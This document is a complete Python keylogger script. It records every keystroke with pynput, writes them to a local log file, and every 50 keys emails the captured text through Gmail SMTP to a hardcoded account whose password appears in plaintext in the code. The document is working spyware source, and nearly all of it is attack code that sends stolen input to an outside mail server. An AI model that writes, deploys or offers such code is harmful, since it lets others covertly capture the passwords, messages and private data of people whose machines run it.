import subprocess
import sys
import logging
import smtplib
import ssl
from pynput.keyboard import Key, Listener
subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

keys = []
count = 0

# Logging file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Recording key presses
def on_press(key):
    logging.info(str(key))
    print(key, "typed")
    global keys, count
    # Adding key pressed to keys array
    keys.append(str(key))
    count+=1
    # Key limit, change after testing over
    if count > 50:
        count = 0
        email(keys)

def email(keys):  
    message = ""
    for key in keys:
        # Replace miscellenous characters to make it more readable 
        x = key.replace("'","")
        if key == "Key.space":
            x = "SPACE"
        elif key == "Key.backspace":
            x = "BACKSPACE"
        message += x
    # Debug terminal message
    print(message)
    # Sending the message
    sendEmail(message)

def sendEmail(message):
    # For SSL
    port = 465
    smtp_server = "smtp.gmail.com"
    senderEmail = "fypkeylogger@gmail.com"
    password = "keylog123##"
    receiverEmail = "fypkeylogger@gmail.com"
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(senderEmail, password)
        server.sendmail(senderEmail, receiverEmail, message)


with Listener(on_press=on_press) as listener :
    listener.join()